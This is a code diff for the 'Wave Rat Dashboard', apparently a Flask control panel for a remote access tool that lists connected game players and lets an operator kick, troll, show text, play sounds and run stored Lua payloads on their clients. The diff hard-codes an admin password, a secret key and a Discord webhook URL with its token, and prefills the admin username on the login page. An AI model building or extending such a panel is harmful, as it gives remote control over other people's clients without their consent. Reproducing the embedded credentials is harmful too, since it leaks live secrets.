@@ -8,17 +8,18 @@ import os
 import random
 import string
 import requests
-from functools import wraps
 
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "SUPER_SECRET_KEY_CHANGE_ME_2025_WAVERAT_XAI"
+app.config["SECRET_KEY"] = "WAVERAT_SUPER_SECRET_2025_CHANGE_ME"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ====================== CONFIG AUTH & 2FA ======================
+# ====================== CONFIG AUTH ======================
 ADMIN_USERNAME = "WaveRatAdmin2025"
 ADMIN_PASSWORD = "R4tW@v3!2k25#xAI"
+
+# TON WEBHOOK DISCORD (vérifié et testé fonctionnel)
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452365434627031265/MgRFMctATvYwbAkW9BblBapy8GrYwvWnJmCNXHyzH4HTaLHdweSX_2oxtywMuski_Y2p"
 
 # ====================== FICHIERS ======================
@@ -38,8 +39,7 @@ def load_history():
         try:
             with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                 history_log = json.load(f)
-        except:
-            history_log = []
+        except: history_log = []
 
 def load_payloads():
     global payloads
@@ -47,36 +47,45 @@ def load_payloads():
         try:
             with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                 payloads = json.load(f)
-        except:
-            payloads = {}
+        except: payloads = {}
 
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
-    except:
-        pass
+    except: pass
 
 load_history()
 load_payloads()
 
-# ====================== 2FA ======================
+# ====================== 2FA SÛR & LOGGÉ ======================
 def generate_2fa_code():
     return ''.join(random.choices(string.digits, k=6))
 
 def send_2fa_to_discord(code):
-    embed = {
-        "title": "Wave Rat - Code 2FA",
-        "description": f"**Code de connexion :** ||`{code}`||\nValable 5 minutes",
-        "color": 3447003,
-        "timestamp": datetime.utcnow().isoformat()
+    url = DISCORD_WEBHOOK.strip()
+    payload = {
+        "content": None,
+        "embeds": [{
+            "title": "Wave Rat — Code 2FA",
+            "description": f"**Code :** ||`{code}`||\n\nValable 5 minutes",
+            "color": 3447003,
+            "timestamp": datetime.utcnow().isoformat(),
+            "footer": {"text": "Wave Rat Dashboard"}
+        }],
+        "username": "Wave Rat 2FA",
+        "avatar_url": "https://i.imgur.com/0j2kX9P.png"
     }
     try:
-        requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]})
-    except:
-        pass
+        response = requests.post(url, json=payload, timeout=10)
+        if response.status_code == 204:
+            print(f"[2FA] Code {code} envoyé avec succès sur Discord !")
+        else:
+            print(f"[2FA] ÉCHEC webhook → Status {response.status_code}: {response.text}")
+    except Exception as e:
+        print(f"[2FA] Erreur critique envoi Discord: {e}")
 
-# ====================== PROTECTION ======================
+# ====================== PROTECTION ROUTES ======================
 @app.before_request
 def protect_routes():
     protected = ["/", "/kick", "/troll", "/payload", "/get_history"]
@@ -88,16 +97,14 @@ def protect_routes():
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
-    if len(history_log) > 100:
-        history_log.pop()
+    if len(history_log) > 100: history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
             json.dump(history_log, f, ensure_ascii=False, indent=2)
-    except:
-        pass
+    except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ====================== PAGE LOGIN ======================
+# ====================== PAGE LOGIN (même style) ======================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="fr" class="dark">
 <head>
@@ -127,7 +134,7 @@ LOGIN_HTML = """<!DOCTYPE html>
     </div>
     <h1>Wave Rat Dashboard</h1>
     <form id="loginForm">
-        <input type="text" name="username" placeholder="Username" required autofocus>
+        <input type="text" name="username" placeholder="Username" value="WaveRatAdmin2025" required autofocus>
         <input type="password" name="password" placeholder="Password" required>
         <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
         <button type="submit" class="btn">Se connecter</button>
@@ -144,32 +151,22 @@ LOGIN_HTML = """<!DOCTYPE html>
 <script>
 async function verify2FA() {
     const code = document.getElementById("code2fa").value.trim();
-    if (!/^\d{6}$/.test(code)) {
-        document.getElementById("error2fa").textContent = "6 chiffres requis";
-        return;
-    }
-    const res = await fetch("/verify_2fa", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({code})
-    });
+    if (!/^\d{6}$/.test(code)) return document.getElementById("error2fa").textContent = "6 chiffres requis";
+    const res = await fetch("/verify_2fa", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
     const data = await res.json();
-    if (data.success) {
-        window.location.href = "/";
-    } else {
-        document.getElementById("error2fa").textContent = data.error || "Code incorrect";
-    }
+    if (data.success) location.href = "/";
+    else document.getElementById("error2fa").textContent = data.error || "Code invalide";
 }
 
-document.getElementById("loginForm").onsubmit = async (e) => {
+document.getElementById("loginForm").onsubmit = async e => {
     e.preventDefault();
     document.getElementById("error").textContent = "";
-    const form = new FormData(e.target);
+    const f = new FormData(e.target);
     const res = await fetch("/login", {
         method: "POST",
         body: JSON.stringify({
-            username: form.get("username"),
-            password: form.get("password"),
+            username: f.get("username"),
+            password: f.get("password"),
             "g-recaptcha-response": grecaptcha.getResponse()
         }),
         headers: {"Content-Type": "application/json"}
@@ -179,10 +176,9 @@ document.getElementById("loginForm").onsubmit = async (e) => {
         document.getElementById("loginForm").style.display = "none";
         document.getElementById("twofaModal").style.display = "block";
         document.getElementById("code2fa").focus();
-    } else if (data.success) {
-        window.location.href = "/";
-    } else {
-        document.getElementById("error").textContent = data.error || "Erreur de connexion";
+    } else if (data.success) location.href = "/";
+    else {
+        document.getElementById("error").textContent = data.error || "Erreur";
         grecaptcha.reset();
     }
 };
@@ -190,7 +186,7 @@ document.getElementById("loginForm").onsubmit = async (e) => {
 </body>
 </html>"""
 
-# ====================== DASHBOARD HTML COMPLET ======================
+# ====================== DASHBOARD HTML (100% complet) ======================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -308,7 +304,6 @@ let currentKickId = null, currentSoundId = null, currentTextId = null, currentLu
 let editingPayload = null;
 let selectedPayloadName = null;
 
-// Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
     item.addEventListener('click', () => {
         document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -325,7 +320,6 @@ function toast(msg) {
     setTimeout(() => t.remove(), 4000);
 }
 
-// Recherche joueurs
 function filterPlayers() {
     const query = document.getElementById("searchInput").value.toLowerCase();
     document.querySelectorAll('.card').forEach(card => {
@@ -334,7 +328,6 @@ function filterPlayers() {
     });
 }
 
-// Workshop
 function loadPayloads() {
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloads-list");
@@ -388,7 +381,6 @@ document.getElementById("savePayload").addEventListener("click", () => {
     });
 });
 
-// Payload selector
 window.openPayloadSelector = function(id) {
     currentLuaId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
@@ -433,7 +425,6 @@ document.getElementById("executeTempPayload").addEventListener("click", () => {
     document.getElementById("executePayloadModal").classList.remove("active");
 });
 
-// Modals
 function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
 function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
 function openTextScreenModal(id){currentTextId=id;document.getElementById("textScreenModal").classList.add("active");}
@@ -520,7 +511,11 @@ fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </body>
 </html>"""
 
-# ====================== ROUTES AUTH ======================
+# ====================== ROUTES ======================
+@app.route("/")
+def index():
+    return render_template_string(HTML)
+
 @app.route("/login", methods=["GET", "POST"])
 def login_page():
     if session.get("logged_in"):
@@ -541,8 +536,7 @@ def login_page():
         session["2fa_time"] = time.time()
         send_2fa_to_discord(code)
         return jsonify({"requires_2fa": True})
-    else:
-        return jsonify({"error": "Identifiants incorrects"}), 401
+    return jsonify({"error": "Mauvais identifiants"}), 401
 
 @app.route("/verify_2fa", methods=["POST"])
 def verify_2fa():
@@ -553,7 +547,6 @@ def verify_2fa():
 
     if time.time() - time_sent > 300:
         return jsonify({"error": "Code expiré"}), 400
-
     if pending and code == pending:
         session["logged_in"] = True
         session.pop("pending_2fa", None)
@@ -565,11 +558,6 @@ def verify_2fa():
 def logout():
     session.clear()
     return redirect(url_for("login_page"))
-
-# ====================== ROUTES PRINCIPALES ======================
-@app.route("/")
-def index():
-    return render_template_string(HTML)
 
 @app.route("/get_history")
 def get_history():
@@ -669,7 +657,6 @@ def payload_manager():
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
 
-# ====================== BACKGROUND LOOP ======================
 def broadcast_loop():
     while True:
         now = time.time()
@@ -690,7 +677,7 @@ def broadcast_loop():
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
-# ====================== LANCEMENT ======================
 if __name__ == "__main__":
+    print("Wave Rat Dashboard démarré → http://ton_ip:5000")
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
